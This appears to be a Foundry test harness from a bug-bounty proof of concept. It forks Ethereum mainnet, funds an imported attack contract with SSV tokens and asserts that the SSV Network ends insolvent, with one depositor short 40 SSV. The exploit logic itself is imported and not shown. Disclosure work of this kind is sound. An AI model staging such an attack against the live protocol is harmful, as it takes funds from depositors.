// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/SSVInsolvencyPoC.sol";
import "../src/PoC.sol";

/**
 * @title SSV Insolvency PoC Test
 * @notice Foundry test demonstrating protocol insolvency
 * @dev Run with: forge test -vv --match-path test/SSVInsolvencyPoC.t.sol
 * 
 * SAFETY: This test runs on a LOCAL FORK of mainnet using vm.createSelectFork().
 * No transactions are sent to actual mainnet or public testnets. This tests 
 * against the actual deployed SSV Network contracts as required by Immunefi 
 * guidelines. No DoS attacks are performed.
 */
contract SSVInsolvencyPoCTest is PoC {
    SSVInsolvencyPoC attackContract;
    IERC20[] tokens;
    
    address constant SSV_TOKEN = 0x9D65fF81a3c488d585bBfb0Bfe3c7707c7917f54;

    function setUp() public {
        // Fork mainnet at a recent block for accurate testing
        // This ensures we're testing against the actual deployed SSV Network contracts
        vm.createSelectFork("mainnet", 19000000);
        
        // Deploy the attack contract
        attackContract = new SSVInsolvencyPoC();
        
        // Setup tokens to track
        tokens.push(IERC20(SSV_TOKEN));
        
        // Give attacker some SSV tokens for the demonstration
        // deal() works with the actual token contract on the forked mainnet
        deal(SSV_TOKEN, address(attackContract), 1010e18);
        
        // Set aliases for better logging
        setAlias(address(attackContract), "Attacker/Operator");
        
        console.log(">>> Initial State Setup Complete");
        console.log(">>> SSV Network Insolvency Vulnerability Demonstration");
        console.log(">>> Testing against actual SSV Network contracts on forked mainnet");
    }

    /**
     * @notice Main test function demonstrating the insolvency vulnerability
     * @dev Uses the snapshot modifier to print balances before and after
     */
    function testInsolvencyAttack() 
        public 
        snapshot(address(attackContract), tokens) 
    {
        attackContract.initiateAttack();
        
        // Verify the deficit exists
        uint256 deficit = attackContract.getDeficit();
        require(deficit > 0, "Vulnerability not demonstrated: no deficit");
        
        console.log("\n>>> VULNERABILITY CONFIRMED");
        console.log("Protocol deficit:");
        console.log(deficit / 1e18);
        console.log("SSV");
    }
    
    /**
     * @notice Test to verify the accounting mismatch
     */
    function testAccountingMismatch() public {
        // Initial state: User A (1000) + User B (10) = 1010 SSV
        uint256 expectedInitial = 1010e18;
        
        attackContract.initiateAttack();
        
        // After operator withdrawal: 1010 - 50 = 960 SSV
        // But User A is entitled to 1000 SSV
        uint256 finalBalance = attackContract.getContractBalance();
        
        // User A can only withdraw 960, losing 40 SSV
        require(finalBalance < 1000e18, "User A should not be able to withdraw full deposit");
        
        console.log("Accounting mismatch confirmed:");
        console.log("User A entitlement: 1000 SSV");
        console.log("Contract balance:");
        console.log(finalBalance / 1e18);
        console.log("SSV");
        console.log("Shortfall:");
        console.log((1000e18 - finalBalance) / 1e18);
        console.log("SSV");
        }
    }
    